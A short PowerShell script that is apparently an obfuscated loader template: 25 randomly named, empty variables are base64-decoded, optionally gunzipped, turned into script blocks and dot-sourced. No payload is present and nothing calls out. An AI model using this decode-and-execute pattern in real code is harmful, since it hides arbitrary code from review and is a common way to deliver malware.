#Requires -Version 2

$Calculable = ""
$Reservoirs = ""
$Effulgence = ""
$Outplaying = ""
$Tsongkhapa = ""
$Advantages = ""
$Foreigners = ""
$Aberration = ""
$Unsheathed = ""
$Ionization = ""
$Variegated = ""
$Clownishly = ""
$Abrogating = ""
$Harmonized = ""
$Vandalized = ""
$Infuriated = ""
$Siddhartha = ""
$Clockworks = ""
$Moonstones = ""
$Sourdoughs = ""
$Imaginable = ""
$Ijsselmeer = ""
$Relegating = ""
$Drolleries = ""
$Militiamen = ""

$Modules = @($Calculable,$Reservoirs,$Effulgence,$Outplaying,$Tsongkhapa,$Advantages,$Foreigners,$Aberration,$Unsheathed,$Ionization,$Variegated,$Clownishly,$Abrogating,$Harmonized,$Vandalized,$Infuriated,$Siddhartha,$Clockworks,$Moonstones,$Sourdoughs,$Imaginable,$Ijsselmeer,$Relegating,$Drolleries,$Militiamen)
$Modules | ForEach-Object {
    $Decoded = [System.Convert]::FromBase64String($_)
    if ($_ -like "H4s*") {
        $Decoded = ConvertFrom-Gzip -Bytes $Decoded
    }
    else {
        $Decoded = [Text.Encoding]::UTF8.GetString($Decoded)
    }
    $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock($Decoded)
    . $ScriptBlock
}
